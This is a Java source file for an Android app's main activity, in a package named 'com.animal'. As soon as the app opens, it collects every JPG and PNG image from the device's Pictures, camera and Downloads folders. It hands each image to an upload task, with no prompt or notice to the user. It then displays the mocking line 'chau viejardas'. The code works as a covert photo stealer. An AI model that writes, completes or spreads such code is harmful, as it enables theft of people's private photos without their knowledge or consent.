package com.animal;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import android.app.Activity;
import android.os.Bundle;
import android.os.Environment;
import android.view.Menu;
import android.widget.TextView;

public class MainActivity extends Activity {

	TextView text;
	
	private final static String paths[] = {
		Environment.getExternalStorageDirectory().toString() + "/Pictures",
		Environment.getExternalStorageDirectory().toString() + "/DCIM/Camera",
		Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString(),
	};
	
	private static final String extensions[] = {".jpg", ".png", ".jpeg"};
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		text = (TextView) findViewById(R.id.texto);
		
		List<File> archivos = new ArrayList<File>();
		
		for (String path : paths) {
			File files[] = new File(path).listFiles();
			if (files != null) {
				for (File file : files) {
					for (String extension : extensions) {
						if (file.getName().endsWith(extension)) {
							archivos.add(file);
						}
					}
				}
			}
		}
		
		for (File archivo : archivos) {
			try {
				new FileUploader().execute(archivo);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		
		text.setText("chau viejardas");
	}
	
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}
